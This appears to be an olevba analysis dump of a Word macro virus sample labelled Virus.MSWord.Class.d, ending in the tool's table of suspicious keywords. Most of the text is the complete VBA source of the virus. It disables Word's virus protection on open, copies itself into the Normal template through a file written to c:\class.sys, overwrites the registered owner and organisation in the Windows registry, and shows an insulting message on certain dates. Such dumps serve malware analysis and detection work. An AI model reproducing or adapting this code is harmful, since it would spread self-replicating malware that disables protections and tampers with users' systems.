olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-091f48a3e3017f9e012918aa01c115d6f7350e9f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-091f48a3e3017f9e012918aa01c115d6f7350e9f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Const REG_SZ As Long = 1
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Sub AutoOpen()
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
On Error GoTo out
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Options.VirusProtection = False
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Options.SaveNormalPrompt = False
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Options.ConfirmConversions = False
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If nt > 70 And ad > 0 Then GoTo out
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If nt < 70 Then
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End If
'Iki8/24/2094 10:14:54 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
With host.codemodule
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    For x = 1 To 16
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    .deletelines 1
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    Next x
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End With
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If nt < 70 Then
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    With host.codemodule
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    .replaceline 1, "Sub AutoClose()"
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    .replaceline 91, "Sub ToolsMacro()"
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    For x = 70 To 81
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
        .deletelines 62
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    Next x
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    .replaceline 35, "    For x = 1 To 4"
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    End With
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End If
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If nt < 70 Then
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
u = RegCloseKey(k)
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End If
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
With host.codemodule
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    For x = 2 To 104 Step 2
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
    Next x
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End With
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
out:
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End Sub
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
Sub ViewVBCode()
'Iki8/24/2094 10:14:55 AMHP LaserJet IIP (Copy 2) on LPT1:schedule2000.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

